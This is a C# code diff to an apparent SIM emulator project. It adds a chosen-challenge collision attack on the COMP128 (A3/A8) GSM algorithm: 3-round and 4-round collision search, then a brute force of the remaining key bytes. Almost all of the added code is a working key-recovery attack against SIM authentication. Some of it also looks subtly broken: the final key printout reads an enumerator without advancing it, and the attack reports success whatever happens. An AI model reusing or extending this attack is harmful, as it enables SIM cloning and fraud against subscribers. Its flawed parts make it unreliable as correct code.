@@ -181,11 +181,13 @@ namespace SIMEmu
         }
 
         //Return all pairs of 2R partial collisions, differ only in [offset]
-        Dictionary<int, List<uint>> cache_2rpc = new Dictionary<int, List<uint>>();
+        Dictionary<int, List<uint>>[] cache_2rpc = new Dictionary<int, List<uint>>[4];
         private List<uint> find_2rpc_pair(int k0, int k8, int offset)
         {
+            if (cache_2rpc[offset] == null)
+                cache_2rpc[offset] = new Dictionary<int, List<uint>>();
             int pk = (k0 << 8) | k8;
-            if (cache_2rpc.ContainsKey(pk)) return cache_2rpc[pk];
+            if (cache_2rpc[offset].ContainsKey(pk)) return cache_2rpc[offset][pk];
 
             List<KeyValuePair<uint, uint>> hashes = new List<KeyValuePair<uint, uint>>();
             uint mask = ~((uint)0x7F << (7*offset));
@@ -206,7 +208,7 @@ namespace SIMEmu
                         result.Add((prev.Current.Key << 16) | p.Current.Key);
                 prev = p;
             }
-            cache_2rpc[pk] = result;
+            cache_2rpc[offset][pk] = result;
             return result;
         }
         private bool Find3RCollisionPair(int k0, int k4, int k8, int k12, ref uint r0, ref uint r1)
@@ -324,7 +326,8 @@ namespace SIMEmu
                         int k12 = (k412p.Key >> 0) & 0xFF;
                         uint test_r0 = 0, test_r1 = 0;
                         //Obtain another 3R collision pair for a particular key and test in on real algo.
-                        Debug.Assert(Find3RCollisionPair(k0, k4, k8, k12, ref test_r0, ref test_r1));
+                        bool trc = Find3RCollisionPair(k0, k4, k8, k12, ref test_r0, ref test_r1);
+                        Debug.Assert(trc);
                         Unpack4Bytes(test_r0, ref test_r[kid], ref test_r[kid + 4], ref test_r[kid + 8], ref test_r[kid + 12]);
                         comp128.A38(test_r, test_rst0);
                         Unpack4Bytes(test_r1, ref test_r[kid], ref test_r[kid + 4], ref test_r[kid + 8], ref test_r[kid + 12]);
@@ -343,7 +346,138 @@ namespace SIMEmu
                             new object[] { k0, (k412r.Key >> 8) & 0xFF, k8, (k412r.Key >> 0) & 0xFF }));
                     K412P = K412R;
                 }while (K412R.Count > 1);
+                if (K412R.Count == 1)
+                {
+                    int k412r = K412R.Find(x => true).Key;
+                    if (Attack4R(k0, k412r >> 8, k8, k412r & 0xFF)) return;
+                }
             }
+        }
+
+        private List<ulong> find_3rpc_pair(int k0, int k4, int k8, int k12, int offset)
+        {
+            //int pk = (k0 << 8) | k8;
+            //if (cache_2rpc.ContainsKey(pk)) return cache_2rpc[pk];
+            uint[] r0 = new uint[4]; //r0, r4, r8, r12
+            uint[] r1 = new uint[4];
+            long mask = ~((long)0x3F << (6*offset));
+            List<ulong> result = new List<ulong>();
+            foreach (var r08 in find_2rpc_pair(k0, k8, offset / 2))
+                foreach (var r412 in find_2rpc_pair(k4, k12, offset / 2))
+                {
+                    uint r0_8 = r08 & 0xFF;
+                    uint r0_0 = (r08 >> 8) & 0xFF;
+                    uint r1_8 = (r08 >> 16) & 0xFF;
+                    uint r1_0 = (r08 >> 24) & 0xFF;
+                    uint r0_12 = r412 & 0xFF;
+                    uint r0_4 = (r412 >> 8) & 0xFF;
+                    uint r1_12 = (r412 >> 16) & 0xFF;
+                    uint r1_4 = (r412 >> 24) & 0xFF;
+                    long x = Comp128.Compute3R(k0, k4, k8, k12, (int)r0_0, (int)r0_4, (int)r0_8, (int)r0_12);
+                    long y = Comp128.Compute3R(k0, k4, k8, k12, (int)r1_0, (int)r1_4, (int)r1_8, (int)r1_12);
+                    if (((x^y) & mask) == 0)
+                    {
+                        result.Add(((ulong)Pack4Bytes((byte)r0_0, (byte)r0_4, (byte)r0_8, (byte)r0_12)) |
+                            (((ulong)Pack4Bytes((byte)r1_0, (byte)r1_4, (byte)r1_8, (byte)r1_12)) << 32)
+                        );
+                    }
+                }
+            return result;
+        }
+
+        //4R collision is defined Useful if there exists only one Y such that swap(x0, Y) == swap(x1, Y)
+        private int is_usable_4RCollision(int x0, int x1)
+        {
+            int r = -1;
+            for (int y = 0; y < (1 << 6); y++)
+            {
+                int x0_ = x0, x1_ = x1, y0 = y, y1 = y;
+                Comp128.swap(ref x0_, ref y0, 3);
+                Comp128.swap(ref x1_, ref y1, 3);
+                if (x0_ == x1_ && y0 == y1)
+                    if (r != -1)
+                        return -1;
+                    else
+                        r = y;
+            }
+            return r;
+        }
+        //By constructing appropriate 3R partial collisions, induce 4R collision probabilistically. 
+        //If 4R collision is detected, one byte (6bits) of the state of the cipher after 3R can be determined.
+        //By repeatedly obtaining these bytes, enough information is gathered to break k_(4i+2)
+        public bool Attack4R(int k0, int k4, int k8, int k12)
+        {
+            byte[] test_r = new byte[16];
+            byte[] test_rst0 = new byte[12];
+            byte[] test_rst1 = new byte[12];
+            byte[] r0 = new byte[4];
+            byte[] r1 = new byte[4];
+            List<byte[]> candidates = null;
+            for(int offset = 0;offset < 8; offset++)
+                foreach (var rpc in find_3rpc_pair(k0, k4, k8, k12, offset))
+                {
+                    Unpack4Bytes((uint)rpc, ref r0[0], ref r0[1], ref r0[2], ref r0[3]);
+                    Unpack4Bytes((uint)(rpc >> 32), ref r1[0], ref r1[1], ref r1[2], ref r1[3]);
+                    long rr0 = Comp128.Compute3R(k0, k4, k8, k12, r0[0], r0[1], r0[2], r0[3]);
+                    long rr1 = Comp128.Compute3R(k0, k4, k8, k12, r1[0], r1[1], r1[2], r1[3]);
+                    int intermediate_r = is_usable_4RCollision((int)(rr0 >> (6 * offset)) & 0x3F, (int)(rr1 >> (6 * offset)) & 0x3F);
+                    if (intermediate_r < 0) continue;
+                    for (int c = 0; c < 2*(1 << 6); c++) //Find 4R collision probabilistically with p = 1/(1<<6)
+                    {
+                        (new Random()).NextBytes(test_r);
+                        Unpack4Bytes((uint)rpc, ref test_r[kid], ref test_r[kid + 4], ref test_r[kid + 8], ref test_r[kid + 12]);
+                        comp128.A38(test_r, test_rst0);
+                        Unpack4Bytes((uint)(rpc >> 32), ref test_r[kid], ref test_r[kid + 4], ref test_r[kid + 8], ref test_r[kid + 12]);
+                        comp128.A38(test_r, test_rst1);
+                        bool collide = (Pack8Bytes(test_rst0) == Pack8Bytes(test_rst1));
+                        if (collide) //Obtain 6 bits of information, time to bruteforce.
+                        {
+                            byte r2 = test_r[kid + 2], r6 = test_r[kid + 6], r10 = test_r[kid + 10], r14 = test_r[kid + 14];
+                            //long x = Comp128.Compute3R(0xAA, 0x9F, 0x05, 0x28, test_r[kid + 2], test_r[kid + 6], test_r[kid + 10], test_r[kid + 14]);
+                            //int y = (int)(x >> (6 * offset)) & 0x3F;
+                            if (candidates == null) //First time is slow
+                            {
+                                Console.WriteLine("Starting brute force:");
+                                candidates = new List<byte[]>();
+                                long x;
+                                for (int k2 = 0; k2 <= 0xFF; k2++)
+                                    for (int k6 = 0; k6 <= 0xFF; k6++)
+                                    {
+                                        Console.Write(String.Format("\r {0}/65536", k2 * 256 + k6));
+                                        for (int k10 = 0; k10 <= 0xFF; k10++)
+                                            for (int k14 = 0; k14 <= 0xFF; k14++)
+                                            {
+                                                x = Comp128.Compute3R(k2, k6, k10, k14, r2, r6, r10, r14);
+                                                if (((int)(x >> (6 * offset)) & 0x3F) == intermediate_r)
+                                                    candidates.Add(new byte[] { (byte)k2, (byte)k6, (byte)k10, (byte)k14 });
+                                            }
+                                    }
+                                Console.Write(String.Format("\n Obtained {0} candidates.", candidates.Count));
+                                break;
+                            }
+                            else //Refine Candidates.
+                            {
+                                Console.Write("Refining..");
+                                List<byte[]> c2 = new List<byte[]>();
+                                foreach (var k in candidates)
+                                {
+                                    long x = Comp128.Compute3R(k[0], k[1], k[2], k[3], r2, r6, r10, r14);
+                                    if (((int)(x >> (6 * offset)) & 0x3F) == intermediate_r)
+                                        c2.Add(new byte[] { k[0], k[1], k[2], k[3] });
+                                }
+                                candidates.Clear();
+                                candidates = c2;
+                                Console.Write(String.Format("Refined to {0} candidates.", candidates.Count));
+                                if (candidates.Count == 1)
+                                {
+                                    Console.WriteLine(String.Format("4R Key: {0:x2} {1:x2} {2:x2} {3:x2}", candidates.GetEnumerator().Current));
+
+                                }
+                            }
+                        }
+                    }
+                }
+            return true;
         }
         public void Collect()
         {
